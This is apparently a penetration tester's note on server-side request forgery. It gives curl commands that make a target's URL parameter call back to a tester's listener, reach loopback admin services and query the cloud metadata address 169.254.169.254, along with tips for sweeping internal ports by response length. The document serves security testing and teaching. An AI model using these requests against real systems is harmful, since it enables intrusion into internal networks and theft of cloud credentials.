# Server-Side Request Forgery

A parameter that makes the server fetch a URL for you. The prize is not the fetch itself, it is the position: the server sits inside the network and you do not, so its requests reach hosts, ports and metadata services that your own packets never will.

## 1 — Does this parameter fetch, and does the server do the fetching

```bash
python3 -m http.server 8000
```

```bash
curl -s "http://TARGET/preview?url=http://YOUR_IP:8000/probe-a"
```

- Run the listener on your own machine first and leave it in a second terminal. The whole test is whether a line appears in it.
- Use a distinct path per test (`/probe-a`, `/probe-b`). When three tests are in flight, the path is the only thing that tells you which one landed.
- If nothing arrives, repeat the test from your browser. A hit from the browser and no hit from `curl` means the fetch is client-side and there is no [[Security-Terms#^ssrf|SSRF]] here.

## 2 — What can the server reach that you cannot

```bash
curl -s "http://TARGET/preview?url=http://127.0.0.1:8080/" -o - | head -40
```

```bash
curl -s "http://TARGET/preview?url=http://169.254.169.254/latest/meta-data/" -o - | head -40
```

- `127.0.0.1` is the point of the technique. Services bound to loopback were never in your `nmap` output, and admin panels, debug endpoints and databases live there precisely because their owner believed they were unreachable.
- `169.254.169.254` is the [[Security-Terms#^imds|IMDS]] address on every major cloud. A plain fetch works only against version 1. Version 2 needs a `PUT` first to get a token, so a `403` here is a version answer, not a dead end.
- Sweeping ports through the parameter works, but read the **length** of the response rather than the body: a closed port usually returns the app's own error page at a constant size, and an open one returns something else.
